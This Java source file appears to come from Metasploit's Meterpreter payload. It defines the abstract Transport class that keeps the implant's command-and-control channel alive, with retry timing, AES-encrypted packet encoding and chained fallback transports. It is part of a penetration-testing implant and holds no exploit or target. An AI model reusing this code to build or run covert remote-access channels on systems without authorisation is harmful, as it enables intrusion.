package com.metasploit.meterpreter;

import com.metasploit.TLVPacket;
import com.metasploit.stage.TransportConfig;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.io.IOException;

public abstract class Transport {
    public static final long MS = 1000L;

    private Transport prev;
    private Transport next;
    private Meterpreter meterpreter;

    protected String url;
    protected long commTimeout;
    protected long retryTotal;
    protected long retryWait;
    protected byte[] aesKey;
    protected boolean aesEnabled;

    protected abstract boolean tryConnect(Meterpreter met) throws IOException;

    public abstract void bind(DataInputStream in, OutputStream rawOut);
    public abstract void disconnect();
    public abstract boolean dispatch(Meterpreter met);
    public abstract void writePacket(TLVPacket packet, int type) throws IOException;
    public abstract TLVPacket readPacket() throws IOException;
    public abstract boolean switchUri(String uri);

    protected Transport(Meterpreter met, String url) {
        this.meterpreter = met;
        this.url = url;
        this.aesEnabled = false;
    }

    protected void setTimeouts(TransportConfig transportConfig) {
        this.commTimeout = transportConfig.comm_timeout;
        this.retryTotal = transportConfig.retry_total;
        this.retryWait = transportConfig.retry_wait;
    }

    protected TLVPacket readAndDecodePacket(DataInputStream in) throws IOException {
        return TLVPacket.fromEncoded(in, this.aesKey);
    }

    protected void encodePacketAndWrite(TLVPacket tlvPacket, int type, DataOutputStream out) throws IOException {
        byte[] packet;
        if (this.aesKey != null && this.aesEnabled) {
            packet = tlvPacket.toEncoded(type, this.aesKey, this.meterpreter.getSessionGUID());
        } else {
            this.aesEnabled = (this.aesKey != null); // enabled it after the response packet goes out
            packet = tlvPacket.toEncoded(type, null, this.meterpreter.getSessionGUID());
        }

        // send it!
        synchronized (out) {
            out.write(packet);
            out.flush();
        }
    }

    public void setAesEncryptionKey(byte[] aesKey) {
        this.aesKey = aesKey;
        this.aesEnabled = false;
    }

    public String getUrl() {
        return this.url;
    }

    public long getCommTimeout() {
        return this.commTimeout / MS;
    }

    public void setCommTimeout(long commTimeout) {
        this.commTimeout = commTimeout * MS;
    }

    public long getRetryTotal() {
        return this.retryTotal / MS;
    }

    public void setRetryTotal(long retryTotal) {
        this.retryTotal = retryTotal * MS;
    }

    public long getRetryWait() {
        return this.retryWait / MS;
    }

    public void setRetryWait(long retryWait) {
        this.retryWait = retryWait * MS;
    }

    public boolean connect(Meterpreter met) {
        long lastAttempt = System.currentTimeMillis();
        this.aesKey = null;
        this.aesEnabled = false;

        while (System.currentTimeMillis() < lastAttempt + this.retryTotal) {
            try {
                if (this.tryConnect(met)) {
                    return true;
                }
            } catch (Exception ignored) {
            }

            met.sleep(this.retryWait);
        }

        return false;
    }

    public void setPrev(Transport t) {
        this.prev = t;
    }

    public void setNext(Transport t) {
        this.next = t;
    }

    public Transport getPrev() {
        return this.prev;
    }

    public Transport getNext() {
        return this.next;
    }
}

